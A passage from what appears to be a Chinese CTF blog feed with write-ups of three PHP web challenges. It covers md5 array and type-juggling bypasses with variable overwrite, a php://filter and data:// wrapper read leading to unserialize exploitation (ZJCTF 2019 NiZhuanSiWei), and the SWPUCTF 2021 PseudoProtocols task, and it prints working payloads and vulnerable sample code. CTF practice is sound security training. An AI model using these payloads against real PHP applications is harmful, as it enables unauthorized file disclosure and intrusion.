class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gdou&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gdou&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gdou&#x27;</span>]!=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>)===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>]))&#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>]==<span class="hljs-string">&#x27;j0k3r&#x27;</span>)&#123;<br>               <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bbb&#x27;</span>]))&#123;<br>                  <span class="hljs-variable">$aaa</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>];<br>                  <span class="hljs-variable">$bbb</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bbb&#x27;</span>];<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$aaa</span>==<span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-variable">$bbb</span>==<span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-variable">$aaa</span>!=<span class="hljs-variable">$bbb</span>)&#123;<br>                   <span class="hljs-variable">$give</span> = <span class="hljs-string">&#x27;cancanwordflag&#x27;</span>;<br>                   <span class="hljs-variable">$get</span> =<span class="hljs-string">&#x27;hacker!&#x27;</span>;<br>                   <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>                         <span class="hljs-keyword">die</span>(<span class="hljs-variable">$give</span>);<br>                    &#125;<br>                   <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span> || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>                       <span class="hljs-keyword">die</span>(<span class="hljs-variable">$get</span>);<br>                    &#125;<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                        <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$value</span>;<br>                   &#125;<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                         <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$$value</span>;<br>                    &#125;<br>                   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;洗洗睡吧&quot;</span>;<br>                 &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;行不行啊细狗&quot;</span>;<br>        &#125;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;菜菜&#x27;</span>;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;就这?&quot;</span>;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;别来沾边&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这里就直接看他的几个if判断就可以</p><p>第一个判断通过POST传入变量ctf和gdou，并且让它们的MD5值相等，这里运用的是md5强比较，数组绕过就可以</p><p>绕过第一个if就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">POST<br>ctf[]=<span class="hljs-number">1</span>&amp;gdou[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>第二个if及时让cookie的值等于他给我们的j0k3r就可以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cookie=j0k3r<br></code></pre></td></tr></table></figure><p>下面的if通过GET传两个变量aaa和bbb他们的值都为114514但是又不能让他们相等，所以我们在bbb后面加一个字符a即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GET<br>?aaa=<span class="hljs-number">114514</span>&amp;bbb=<span class="hljs-number">114514</span>a<br></code></pre></td></tr></table></figure><p>下面的if用POST或GET传一个flag</p><p>运用foreach函数：语句将遍历数组array，每次循环时，将当前数组中的值赋给value（或者 k e y 和 key和 key和value），同时，数组指针向后移动直到遍历结束</p><p>所以GET传参</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GET<br>flag=<span class="hljs-number">123</span>=flag&amp;flag=<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>总结payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">GET<br>?aaa=<span class="hljs-number">114514</span>&amp;bbb=<span class="hljs-number">114514</span>a&amp;<span class="hljs-number">123</span>=flag&amp;flag=<span class="hljs-number">123</span><br>POST<br>ctf[]=<span class="hljs-number">1</span>&amp;gdou[]=<span class="hljs-number">2</span><br>cookie<br>cookie=j0k3r<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ZJCTF 2019NiZhuanSiWei</title>
    <link href="/2023/04/27/ZJCTF-2019NiZhuanSiWei/"/>
    <url>/2023/04/27/ZJCTF-2019NiZhuanSiWei/</url>
    
    <content type="html"><![CDATA[<p>题目提示伪协议加反序列化，打开环境看到前一部分源码，应该是利用伪协议读取反序列化代码的。</p><p><img src="E:\blog\source_posts\ZJCTF-2019NiZhuanSiWei\image-20230427143312278.png" alt="image-20230427143312278"></p><p>先利用data协议绕过第一个if判断payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?text=data:<span class="hljs-comment">//text/plain,welcomme to zjctf</span><br></code></pre></td></tr></table></figure><p>然后再利用filter协议读取他给的一个useless.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file=php:<span class="hljs-comment">//filter/read=convert.base64-enconde/resource=useless.php</span><br></code></pre></td></tr></table></figure><p>联合一起就是payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?text=data:<span class="hljs-comment">//text/plain,welcomme to zjctf&amp;file=php://filter/read=convert.base64-enconde/resource=useless.php</span><br></code></pre></td></tr></table></figure><p>然后得到一段base64编码的字符解码</p><p>解码后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br><br></code></pre></td></tr></table></figure><p>这道题就是运用pasword这个点进行反序列化，触发tostring魔术方法只需要让file变量等于flag.php然后进行序列化此外注意这道题用了url编码，我们也要用</p><p>pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">flag</span>()));<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>整体payload就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">text=data:<span class="hljs-comment">//text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SWPUCTF2021新生赛PseudoProtocols</title>
    <link href="/2023/04/24/SWPUCTF2021%E6%96%B0%E7%94%9F%E8%B5%9BPseudoProtocols-1/"/>
    <url>/2023/04/24/SWPUCTF2021%E6%96%B0%E7%94%9F%E8%B5%9BPseudoProtocols-1/</url>
    
    <content type="html"><![CDATA[<h1 id="SWPUCTF-2021-新生赛-PseudoProtocols"><a href="#SWPUCTF-2021-新生赛-PseudoProtocols" class="headerlink" title="[SWPUCTF 2021 新生赛]PseudoProtocols"></a>[SWPUCTF 2021 新生赛]PseudoProtocols</h1><p>这一题主要考察了我们php伪协议的知识点，其中利用的两个协议“filter，data协议”</p><p>话不多说直接进入靶机环境</p><p><a href="https://z4a.net/image/Vu3wx2">https://z4a.net/image/Vu3wx2</a></p><p>意思就是让我们去找到hint.php,这时候就考虑php:&#x2F;&#x2F;filter协议</p><p>我对filter协议的理解就是利用过滤器，去读取我们想要的文件，其中过滤器可以用各种编码实现，比如最常用的base64编码，具体实现格式就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><p>这样后就直接可以将flag.php的明文以base64的形式显示到界面上。</p><p>这一题也是同样的做法直接将flag.php换位hint.php就可以了。</p><p><a href="https://z4a.net/image/Vu3P2p">https://z4a.net/image/Vu3P2p</a></p><p>然后将这些解密，他让我们去访问</p><p><a href="https://z4a.net/image/Vu3xcG">https://z4a.net/image/Vu3xcG</a></p><p>然后得到源码</p><p><a href="https://z4a.net/image/Vu3nQU">https://z4a.net/image/Vu3nQU</a></p><p>这段PHP代码的作用是：</p><ol><li>将PHP脚本的最大执行时间设置为180秒。</li><li>显示当前文件的源代码。</li><li>包含一个名为“flag.php”的文件，该文件包含了一个标志变量。</li><li>从GET参数中获取一个名为“a”的变量。</li><li>如果“a”变量被设置，并且读取“a”变量的文件内容等于“I want flag”，则输出“success”和标志变量的值。</li></ol><p>这段代码存在一个漏洞，即可以通过将“a”变量设置为一个包含“I want flag”的文件路径来读取标志变量的值。</p><p>然后我们就可以用到data协议去访问一个包括 I want flag的文件路径</p><p>data协议：data协议是一种特殊的URL协议，可以将数据直接嵌入到URL中，而无需使用外部文件或数据源。data协议的语法如下：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-class"><span class="hljs-keyword">data</span>:[&lt;media <span class="hljs-keyword">type</span>&gt;][;base64],&lt;<span class="hljs-keyword">data</span>&gt;；前两个变量可以不要</span><br></code></pre></td></tr></table></figure><p>具体用法就如下payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">payload=?a=data:<span class="hljs-comment">//text/666,I want flag</span><br><span class="hljs-comment">//正确用法text/后面跟的是plain我这里用的666，但flag也出来了。</span><br></code></pre></td></tr></table></figure><p><a href="https://z4a.net/image/Vu3ErI">https://z4a.net/image/Vu3ErI</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
